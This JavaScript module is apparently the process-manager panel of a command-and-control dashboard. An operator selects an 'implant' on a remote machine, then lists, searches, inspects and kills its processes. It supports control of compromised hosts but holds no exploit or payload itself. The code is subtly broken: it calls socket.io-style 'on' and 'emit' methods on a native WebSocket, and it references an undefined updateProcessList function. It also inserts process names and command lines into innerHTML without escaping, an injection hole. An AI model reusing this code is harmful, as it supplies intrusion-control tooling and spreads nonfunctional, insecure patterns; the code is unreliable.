// Process Manager Module
const ProcessManager = {
    socket: null,
    selectedImplant: null,
    processList: [],
    searchTerm: '',

    init(socket) {
        this.socket = socket;
        this.setupEventListeners();
    },

    setupEventListeners() {
        // Refresh button
        document.getElementById('refresh-processes').addEventListener('click', () => this.refreshProcesses());

        // Search input
        document.getElementById('process-search').addEventListener('input', (e) => {
            this.searchTerm = e.target.value.toLowerCase();
            this.filterProcesses();
        });

        // Socket event listeners
        this.socket.on('process_list', this.handleProcessList.bind(this));
        this.socket.on('process_killed', this.handleProcessKilled.bind(this));
    },

    selectImplant(implantId) {
        this.selectedImplant = implantId;
        this.refreshProcesses();
    },

    refreshProcesses() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        this.socket.emit('get_processes', {
            implant_id: this.selectedImplant
        });
    },

    handleProcessList(data) {
        this.processList = data.processes;
        this.filterProcesses();
    },

    filterProcesses() {
        const filteredProcesses = this.searchTerm
            ? this.processList.filter(process => 
                process.name.toLowerCase().includes(this.searchTerm) ||
                process.pid.toString().includes(this.searchTerm) ||
                process.user.toLowerCase().includes(this.searchTerm)
            )
            : this.processList;

        this.renderProcessList(filteredProcesses);
    },

    renderProcessList(processes) {
        const processList = document.getElementById('process-list');
        processList.innerHTML = '';

        processes.forEach(process => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${process.pid}</td>
                <td>${process.name}</td>
                <td>${process.user}</td>
                <td>${dashboard.formatBytes(process.memory)}</td>
                <td>${process.cpu}%</td>
                <td>
                    <div class="btn-group">
                        <button class="btn btn-sm btn-info" onclick="ProcessManager.viewProcessDetails('${process.pid}')">
                            <i class="fas fa-info-circle"></i> Details
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="ProcessManager.killProcess('${process.pid}')">
                            <i class="fas fa-times"></i> Kill
                        </button>
                    </div>
                </td>
            `;
            processList.appendChild(row);
        });
    },

    viewProcessDetails(pid) {
        if (!this.selectedImplant) return;

        this.socket.emit('get_process_details', {
            implant_id: this.selectedImplant,
            pid: pid
        });
    },

    killProcess(pid) {
        if (!this.selectedImplant) return;

        if (confirm(`Are you sure you want to kill process ${pid}?`)) {
            this.socket.emit('kill_process', {
                implant_id: this.selectedImplant,
                pid: pid
            });
        }
    },

    handleProcessKilled(data) {
        if (data.success) {
            dashboard.showNotification(`Process ${data.pid} killed successfully`, 'success');
            this.refreshProcesses();
        } else {
            dashboard.showNotification(`Failed to kill process ${data.pid}: ${data.error}`, 'danger');
        }
    },

    // Process details modal
    showProcessDetailsModal(details) {
        const modal = document.createElement('div');
        modal.className = 'modal fade';
        modal.id = 'processDetailsModal';
        modal.innerHTML = `
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Process Details</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>Basic Information</h6>
                                <table class="table">
                                    <tr>
                                        <th>PID:</th>
                                        <td>${details.pid}</td>
                                    </tr>
                                    <tr>
                                        <th>Name:</th>
                                        <td>${details.name}</td>
                                    </tr>
                                    <tr>
                                        <th>User:</th>
                                        <td>${details.user}</td>
                                    </tr>
                                    <tr>
                                        <th>Status:</th>
                                        <td>${details.status}</td>
                                    </tr>
                                </table>
                            </div>
                            <div class="col-md-6">
                                <h6>Resource Usage</h6>
                                <table class="table">
                                    <tr>
                                        <th>CPU:</th>
                                        <td>${details.cpu}%</td>
                                    </tr>
                                    <tr>
                                        <th>Memory:</th>
                                        <td>${dashboard.formatBytes(details.memory)}</td>
                                    </tr>
                                    <tr>
                                        <th>Threads:</th>
                                        <td>${details.threads}</td>
                                    </tr>
                                    <tr>
                                        <th>Priority:</th>
                                        <td>${details.priority}</td>
                                    </tr>
                                </table>
                            </div>
                        </div>
                        <div class="row mt-3">
                            <div class="col-12">
                                <h6>Command Line</h6>
                                <pre class="bg-light p-2">${details.command_line}</pre>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="button" class="btn btn-danger" onclick="ProcessManager.killProcess('${details.pid}')">
                            Kill Process
                        </button>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        const modalInstance = new bootstrap.Modal(modal);
        modalInstance.show();

        modal.addEventListener('hidden.bs.modal', () => {
            modal.remove();
        });
    }
};

// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    // Initialize WebSocket connection
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);

    // Handle WebSocket messages
    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === 'process_list') {
            updateProcessList(data.processes);
        }
    };

    ProcessManager.init(socket);
}); 